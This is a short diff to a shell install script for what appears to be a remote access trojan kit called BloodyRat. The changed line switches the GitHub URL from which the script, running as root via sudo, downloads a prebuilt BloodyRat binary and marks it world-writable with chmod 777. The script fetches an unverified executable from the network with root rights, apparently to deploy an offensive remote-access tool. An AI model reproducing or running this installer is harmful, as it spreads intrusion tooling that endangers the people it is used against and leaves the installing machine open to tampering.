@@ -65,7 +65,7 @@ function do_patches () {
 
 function main () {	
 	cd ${main}/server && npm install
- 	sudo su -c "wget -N https://github.com/just-hack/just-hack.github.io/raw/main/BloodyRat/BloodyRat -q -O ${BIN}/BloodyRat" && sudo su -c "chmod 777 ${BIN}/BloodyRat"
+ 	sudo su -c "wget -N https://github.com/Bhaviktutorials/BloodyRat/raw/main/files/BloodyRat -q -O ${BIN}/BloodyRat" && sudo su -c "chmod 777 ${BIN}/BloodyRat"
 }
 
 
